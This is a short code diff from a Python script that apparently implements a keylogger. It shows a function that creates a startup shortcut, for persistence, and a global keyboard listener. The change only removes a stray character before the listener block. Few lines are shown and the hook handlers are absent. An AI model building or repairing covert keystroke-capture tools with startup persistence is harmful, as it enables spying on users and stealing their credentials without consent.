@@ -48,5 +48,5 @@ def create_startup_shortcut():
 
 create_startup_shortcut()
 
-ءwith Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
